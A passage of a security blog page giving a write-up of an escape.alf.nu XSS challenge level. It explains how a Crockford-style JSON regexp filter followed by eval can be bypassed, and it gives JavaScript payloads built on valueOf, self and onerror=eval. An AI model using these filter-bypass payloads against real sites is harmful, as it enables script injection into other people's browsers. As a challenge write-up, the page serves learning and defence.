          text.replace(/"(\\.|[^"\\])*"/g, '')))) {
    try {
      var val = eval('(' + text + ')');
      console.log('' + val);
    } catch (_) {
      console.log('Crashed: '+_);
    }
  } else {
    console.log('Rejected.');
  }
}
</code></pre>

<p>This level is based on a real world filter described by <a href="https://twitter.com/WisecWisec">Stefano Di Paola</a> in this <a href="http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html">post</a></p>

<p>If we study the regexp carefully we will see that the letter "s" is allowed since its within the "u-r" interval, that allows us to use the word "self" and with that we can craft a valid JSON payload. <br>
The trick is that we will be adding "0" to our object so the JS engine will need to calculate the valueOf our object. So if we define the "valueOf" function as the "the<em>easy</em>but<em>expensive</em>way_out" global function, we will be able to invoke it during the arithmetic operation. <br>
The problem is that it will alert "0" since "i" its initialized with "0", but we can do it twice to alert a "1".</p>

<p>Long Solution:  </p>

<pre><code class="language-lang-javascript line-numbers ">{"valueOf":self["the_easy_but_expensive_way_out"]}+0,{"valueOf":self["the_easy_but_expensive_way_out"]}
</code></pre>

<p>That is a nice trick to execute a function when parenthesis are not allowed. But there some more like <a href="https://twitter.com/garethheyes">Gareth</a> famous one:</p>

<pre><code class="language-lang-javascript line-numbers ">onerror=eval;throw['=1;alert\x281\x29']  
</code></pre>

<p>You can get a shorter solution for IE only as explained by <a href="https://twitter.com/WisecWisec">Stefano Di Paola</a> in his <a href="http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html">post</a></p>

<pre><code class="language-lang-javascript line-numbers ">{"valueOf":self["location"],"toString":[]["join"],0:"javascript:alert(1)","length":1}
</code></pre>

<p>And thats all folks, thanks for reading!</p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<nav class="pagination" role="navigation">
        <a class="newer-posts" href="../5/"><span aria-hidden="true">←</span> Newer Posts</a>
    <span class="page-number">Page 6 of 14</span>
        <a class="older-posts" href="http://localhost:2368/page/7/">Older Posts <span aria-hidden="true">→</span></a>
</nav>

    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/prism.js?v=d47df0f104"></script>

</body>

